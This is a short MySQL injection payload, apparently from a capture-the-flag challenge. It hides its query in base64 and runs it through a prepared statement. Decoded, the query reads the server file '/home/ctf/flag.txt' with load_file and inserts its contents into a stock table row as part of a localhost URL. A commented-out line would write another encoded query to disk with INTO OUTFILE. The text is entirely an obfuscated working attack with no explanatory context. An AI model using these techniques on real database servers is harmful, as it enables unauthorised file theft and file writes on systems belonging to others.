
set @q1 := FROM_BASE64('aW5zZXJ0IGludG8gc3RvY2sgKHN0b2NraWQsIG5hbWUsIHF1YW50aXR5LCB2dXJsKSB2YWx1ZXMgKDExMiwgImZsYWdmbGFnIiwgMCwgY2FzdCgoY29uY2F0KCdodHRwOi8vbG9jYWxob3N0Lz9mbGFnPScsIGxvYWRfZmlsZSgnL2hvbWUvY3RmL2ZsYWcudHh0JykpKSBhcyBDSEFSKSk7');
prepare s1 from @q1;
execute s1; deallocate prepare s1;
/*SELECT FROM_BASE64('c2VsZWN0ICoqIGZyb20gdGFzazs=') into OUTFILE ':home:ctf:app:db:test.sql';*/